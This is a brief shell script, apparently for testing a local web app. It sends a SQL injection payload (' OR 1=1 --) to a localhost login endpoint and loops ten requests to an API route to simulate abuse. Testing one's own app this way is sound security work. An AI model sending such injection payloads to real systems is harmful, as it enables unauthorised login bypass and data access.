# Simulate SQL injection on login
curl -X POST http://localhost:5000/login -H "Content-Type: application/json" -d '{"username":"admin","password":"' OR 1=1 --"}'

# Simulate API abuse
for i in {1..10}; do curl http://localhost:5000/api/data; done